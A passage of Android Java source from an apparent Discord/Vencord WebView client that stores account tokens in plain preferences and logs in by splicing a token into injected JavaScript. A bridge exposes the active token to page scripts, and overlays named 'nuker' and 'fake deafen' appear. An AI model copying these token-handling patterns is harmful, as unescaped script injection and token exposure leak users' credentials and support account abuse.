            .setPositiveButton("Add", (d, w) -> {
                String name  = etName.getText().toString().trim();
                String token = etToken.getText().toString().trim();
                if (!name.isEmpty() && !token.isEmpty()) {
                    accs.add(new String[]{name, token});
                    prefs.edit().putString("accounts", gson.toJson(accs)).apply();
                }
            }).setNegativeButton("Cancel", null).show();
    }

    private void switchAccount(String token) {
        prefs.edit().putString("active_token", token).apply();
        webView.evaluateJavascript(
            "javascript:(function(){localStorage.setItem('token',JSON.stringify('"+token+"'));window.location.reload();})();", null);
    }

    private void toast(String msg) {
        runOnUiThread(() -> Toast.makeText(this, msg, Toast.LENGTH_SHORT).show());
    }

    // ──────────────────────────────────────────────────────────
    // Bridge
    // ──────────────────────────────────────────────────────────

    class GSBridge {
        @android.webkit.JavascriptInterface
        public void onVencordReady(String v) {}
        @android.webkit.JavascriptInterface
        public String getToken() { return prefs.getString("active_token",""); }
        @android.webkit.JavascriptInterface
        public boolean isFakeDeafenActive() { return fakeDeafenActive; }
    }

    @Override
    public void onBackPressed() {
        if (cordOverlay.getVisibility()  == View.VISIBLE) { hideOverlay(cordOverlay);  return; }
        if (nukerOverlay.getVisibility() == View.VISIBLE) { hideOverlay(nukerOverlay); return; }
        if (ucoreOverlay.getVisibility() == View.VISIBLE) { hideOverlay(ucoreOverlay); return; }
        if (webView.canGoBack()) { webView.goBack(); return; }
        super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        pool.shutdownNow();
    }
}
